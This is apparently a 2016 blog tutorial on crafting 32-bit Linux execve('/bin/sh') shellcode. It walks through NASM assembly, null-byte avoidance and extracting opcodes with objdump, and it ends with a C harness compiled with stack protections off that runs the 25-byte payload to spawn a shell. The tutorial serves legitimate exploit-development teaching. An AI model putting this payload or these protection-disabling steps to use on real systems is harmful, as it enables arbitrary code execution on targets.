---
title: Crafting Shellcode
date: 2016-11-02
draft: false
tags: [linux,shellcode,assembly,32bit]
---

# Intro
Right! Let me start off by saying that this is not going to be and assembly code
primer. This is just intended to a brief intro into the mindset needed to craft
shellcode. There are blogs and resources more comprehensive than this post that
explain things in greater detail, one such book is the [Shellcoders
Handbook](https://www.amazon.co.uk/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X).

This is just going to be a whrilwind tour, at the end of which you'll have a
highlevel view of the thought process that goes into crafting shellcode.

# Syscalls
In linux (IA32) syscalls are generally called by placing the syscall number in
the EAX register and then putting parameters in EBX, ECX and EDX with the return
value being placed back in EAX. The kernel is then instructed to execute the
call bu triggering the 0x80 interupt

How do we find these syscall numbers? Well these are listed in the include file
unistd_32.h

On the vm I prepared (snag the vagrant file from the Vagrant post) they are in
```
  $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | head -20
  #ifndef _ASM_X86_UNISTD_32_H
  #define _ASM_X86_UNISTD_32_H

  /*
   * This file contains the system call numbers.
   */

  #define __NR_restart_syscall      0
  #define __NR_exit		  1
  #define __NR_fork		  2
  #define __NR_read		  3
  #define __NR_write		  4
  #define __NR_open		  5
  #define __NR_close		  6
  #define __NR_waitpid		  7
  #define __NR_creat		  8
  #define __NR_link		  9
  #define __NR_unlink		 10
  #define __NR_execve		 11
  #define __NR_chdir		 12
```
We are going to write some shellcode which will call the execve syscall which is
number 11.

# Information Gathering
We have our first piece of infomation, 11 is the number for the execve syscall.
The next piece of info we need is what parameters does execve expect. To find
this out we turn to the man pages.
```
  $ man execve
  NAME
         execve - execute program

  SYNOPSIS
         #include <unistd.h>

         int execve(const char *filename, char *const argv[],
                    char *const envp[]);
```
As you can see it takes a string which is the file to execute (which is going to
be /bin/sh in our example) then it takes an argument array and then an array
containing the environment (which will be NULL for our purposes).

To recap our arguments are going to be
* /bin/sh
* [/bin/sh, 0x0]
* 0x0
You may be thinking why the arguments array contains a reference to /bin/sh
again? Well remember from your C days that argv[0] is the program name itself!.

So with that information in mind to think of this call in assembly below is how
we want the registers to end up right before we call the int 0x80 to trigger the
call
* EAX: 11 (execve syscall)
* EBX: Address of string /bin/sh
* ECX: Address of Array containing [/bin/sh, 0x0]
* EDX; Address pinting to a 0z0

# Limitations
When generating shellcode we have a few restrictions.
1. We want the shellcode as small as possible, so we tend to reuse data already
   setup
2. We dont want any NULL bytes as they usually cause problems (as 0x0
   terminsates strings etc)

With that in mind lets continue

# On to the source
First I would like to point out I'm using NASM here which uses intel style
assembly.

First we'll get the string /bin/sh on the stack. Now it will take less
instructions to get 8 bytes onto the stack than 7 (the current length of
/bin/sh) so to get around this we'll put the string //bin/sh on the stack (try
this out linux doesnt care about the extra /)

We have to put the string on in reverse order so we start with the null
terminator

{{< highlight nasm >}}
  xor eax, eax  ; zero out eax
  push eax      ; push the 0x0 on the stack
{{< / highlight >}}

we now have the null terminator on the stack so now lets get the rest of the
string. We'll use python to get the hex value for this
```
  $ python -c 'print "//bin/sh"[::-1].encode("hex")'
  68732f6e69622f2f
```
So we split this in half and then push it onto the stack

{{< highlight nasm >}}
  push 0x68732f6e   ; push the first half to the stack
  push 0x69622f2f   ; push the second half of the stack
  mov ebx, esp      ; move the address of the stack pointer to ebx (1st
                    ; parameter to execve
{{< / highlight >}}

Now we can do two things next
1. Push the 0x0 onto the stack that we can use for the 3rd parameter (address of
   which will go into EDX)
2. We can use the address stored in EBX (the address //bin/sh string) as the
   value of ECX

Point 2 easy to see if you visualize the stack
```
Top                 Bottom of Stack
0x00000000 //bin/sh 0x00000000
EDX        EBX
```
So now if we point ECX to the address of the //bin/sh string we have our array

{{< highlight nasm >}}
  push eax      ; push 0x0 on the stack
  mov  edx, esp ; move the address of 0x0 to the 3rd param
  push ebx      ; push the address of //bin/sh on the stack
  mov  ecx, esp ; move the address of the address of //bin/sh into ecx
                ; which is our secong parameter
{{< / highlight >}}

All that is left to do is to make the call

{{< highlight nasm >}}
  mov al, 11  ; move 11 into EAX (execve call is number 11)
  int 0x80    ; trigger the call
{{< / highlight >}}

Above you will notice I use the al register which the the 8bit version of the
EAX register, this is so there are no NULL bytes in the assembly as 32 bit
version of 11 in hex is 0x0000000b and the 8 bit version is 0x0b.

With that all done here is the final assembly

{{< highlight nasm >}}

global _start
section .text
_start:
  xor  eax, eax	  ; zero out eax
  push eax        ; push NULL onto stack to termins //bin/sh
  push 0x68732f6e ; push //bin/sh in reverse onto the stack
                  ; (extra / is to make data multiple of 4)
  push 0x69622f2f ; see above
  mov  ebx, esp   ; move address of //bin/sh into EBX (execve's 1st parameter)
  push eax        ; this serves two purposes 1, to use for EDX (we will pass no
                  ; environment to the shell and also as part of the array of
                  ; args that we will pass to as the 2nd arg of execve
  mov  edx, esp	  ; see above
  push ebx        ; ESP now points to and array of args [address of //bin/sh, 0x00]
                  ; these will act as the args to //bin/sh
  mov ecx, esp	  ; setup the 3rd argument
  mov al, 11      ; set the EAX register to the execve sys call number
                  ; using al to remove any null bytes
  int 0x80        ; make the call
{{< / highlight >}}

To recap the few tricks we used
1. Used xor to create a NULL without having a null in the code
2. Added the extra / to the /bin/sh string to make pushing the data easier and
   with less instructions
3. Reused data we already had on the stack to create the arguments array for the
   execve call
4. Used the 8 bit version (al) of the EAX register to avoid NULL bytes in the
   generated code

Save the above code to execve.nasm, compile, link and run
```
  $ nasm -f elf32 -o execve.o execve.nasm
  $ ld -o execve execve.o
  $ ./execve
  $
```
If you are running bash you will notice now that your prompt has changed,
congrats your syscall worked!!

# Converting to shellcode
So how do we go about converting this assembled object file into a shellcode
string you see in exploits? There is a little tool called objdump which happens
to have a -d flag and this flag dissasembles object files, lets see
```
  $ objdump -d execve.o

  execve.o:     file format elf32-i386


  Disassembly of section .text:

  00000000 <_start>:
     0:	31 c0                	xor    %eax,%eax
     2:	50                   	push   %eax
     3:	68 6e 2f 73 68       	push   $0x68732f6e
     8:	68 2f 2f 62 69       	push   $0x69622f2f
     d:	89 e3                	mov    %esp,%ebx
     f:	50                   	push   %eax
    10:	89 e2                	mov    %esp,%edx
    12:	53                   	push   %ebx
    13:	89 e1                	mov    %esp,%ecx
    15:	b0 0b                	mov    $0xb,%al
    17:	cd 80                	int    $0x80
```
As you can see we from above we have our original assembly back (kind of). You
see those hex bytes that appear before our assembly instructions? Those are the
op codes that the CPU understands and those are what we need in our shellcode
string.

First we will need only the lines that contain instructions
```
  $ objdump -d execve.o | grep "^ "
     0:	31 c0                	xor    %eax,%eax
     2:	50                   	push   %eax
     3:	68 6e 2f 73 68       	push   $0x68732f6e
     8:	68 2f 2f 62 69       	push   $0x69622f2f
     d:	89 e3                	mov    %esp,%ebx
     f:	50                   	push   %eax
    10:	89 e2                	mov    %esp,%edx
    12:	53                   	push   %ebx
    13:	89 e1                	mov    %esp,%ecx
    15:	b0 0b                	mov    $0xb,%al
    17:	cd 80                	int    $0x80
```
Next we want just the second column or field
```
  $ objdump -d execve.o | grep "^ " | cut -f2
  31 c0
  50
  68 6e 2f 73 68
  68 2f 2f 62 69
  89 e3
  50
  89 e2
  53
  89 e1
  b0 0b
  cd 80
```
Then we want to iterate over each of these bytes and put the \x in front of
them. For loops to the rescue
```
  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo '\x'$i; done
  \x31
  \xc0
  \x50
  \x68
  \x6e
  \x2f
  \x73
  \x68
  \x68
  \x2f
  \x2f
  \x62
  \x69
  \x89
  \xe3
  \x50
  \x89
  \xe2
  \x53
  \x89
  \xe1
  \xb0
  \x0b
  \xcd
  \x80
```
Nearly! Fortunately echo has a -n flag that prevents it from printing newlines
```
  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo -n '\x'$i; done
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80$
```
So close!!!! We can just put an extra echo at the end
```
  $ for i in $(objdump -d execve.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
  \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
  $
```
# Test the shellcode
Now to test the shellcode we need a program we can put this in to run it. Below
is a C program whic I did not create myself (Thanks Vivek from
[SecurityTube](http://www.securitytube.net)

{{< highlight c >}}
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f" \
"\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89" \
"\xe1\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
{{< / highlight >}}

This program just passes execution to our shellcode which we placed in the code
string. Compile it using 
```
  $ gcc -fno-stack-protector -z execstack -o shell_test shell_test.c
  $ ./shell_test 
  Shellcode Length:  25
  $  
```
as you can see the program printed the length of the shellcode and then passed
control of execution to our shellcode and we have now ended up with a shell!

Hope you enjoyed this. Check out [SecurityTube](http://www.securitytube.net)
they have free videos on x86 linux and windows assembly if you are interested in
that sort of thing!
